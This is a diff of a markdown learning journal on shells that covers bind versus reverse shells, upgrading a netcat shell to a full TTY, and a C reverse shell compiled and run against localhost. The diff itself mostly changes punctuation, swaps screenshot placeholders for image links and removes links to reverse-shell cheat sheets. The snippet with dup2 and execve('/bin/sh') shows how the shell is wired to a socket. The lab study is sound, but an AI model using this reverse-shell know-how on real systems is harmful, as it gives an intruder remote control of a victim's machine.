@@ -1,18 +1,18 @@
 # Day 2 — Shells
 
 ## What this day is about
-Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control — run commands, move files, pivot. This day covers the two main shell types and how to upgrade a dumb shell to a fully interactive one.
+Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control, wanna run commands, move files, pivot. This day covers the two main shell types and how to upgrade a dumb shell to a fully interactive one.
 
 ---
 
 ## Bind Shell vs Reverse Shell
 
-**Bind shell** — the victim listens, you connect to it.
+**Bind shell**: the victim listens, you connect to it.
 - Victim runs a listener and waits
 - You connect to it using the victim's IP and port
-- Rarely works in real engagements — firewalls block inbound connections
+- Ion know but i think this rarely works in real engagements, most times, firewalls block inbound connections
 
-**Reverse shell** — you listen, the victim connects back to you.
+**Reverse shell**: you listen, the victim connects back to you.
 - You set up the listener on your machine
 - Victim reaches out to you
 - Works because outbound connections are almost never blocked
@@ -72,7 +72,7 @@ Running commands through the reverse shell:
 
 ## TTY Upgrade
 
-A raw netcat shell is dumb — no tab completion, no arrow keys, Ctrl+C kills the whole session, sudo won't work. Upgrading to a full TTY fixes all of that.
+A raw netcat shell is dumb, it has no tab completion, no arrow keys, Ctrl+C kills the whole session, sudo won't work. Upgrading to a full TTY fixes all of that.
 
 ```bash
 # Step 1 — run inside the reverse shell (the nc listener terminal)
@@ -99,16 +99,20 @@ After running it correctly inside the reverse shell, the prompt changed to a ful
 
 ## C Reverse Shell
 
-The repo includes `shell.c` — a raw C reverse shell. Compiled and ran it to see what a shell looks like when it comes from a binary instead of a bash one-liner.
+The repo includes `shell.c` a raw C reverse shell. Compiled and ran it to see what a shell looks like when it comes from a binary instead of a bash one-liner.
 
 ```bash
 gcc -o shell shell.c
 ./shell 127.0.0.1 4444
 ```
 
-**[SCREENSHOT — gcc compile and ./shell 127.0.0.1 4444 running]**
+<img width="667" height="282" alt="Screenshot 2026-05-13 141801" src="https://github.com/user-attachments/assets/cc156e48-6dd5-49f4-aaee-72c8e3a10242" />
 
-**[SCREENSHOT — listener received connection, id output came back]**
+**[Fig 7: gcc compile and ./shell 127.0.0.1 4444 running]**
+
+<img width="640" height="189" alt="Screenshot 2026-05-13 141710" src="https://github.com/user-attachments/assets/082a1ef2-93b2-4411-91d2-76a8deb9bca3" />
+
+**[Fig 8: listener received connection, id output came back]**
 
 How it works under the hood:
 
@@ -123,7 +127,7 @@ for (int i = 0; i < 3; i++) {
 execve("/bin/sh", NULL, NULL);  // replace process with a shell
 ```
 
-`dup2` rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` — no netcat needed on the victim side, just the binary.
+`dup2` rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` no netcat needed on the victim side, just the binary.
 
 ---
 
@@ -136,6 +140,3 @@ execve("/bin/sh", NULL, NULL);  // replace process with a shell
 
 ---
 
-## Resources
-- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [revshells.com](https://revshells.com) — reverse shell one-liner generator
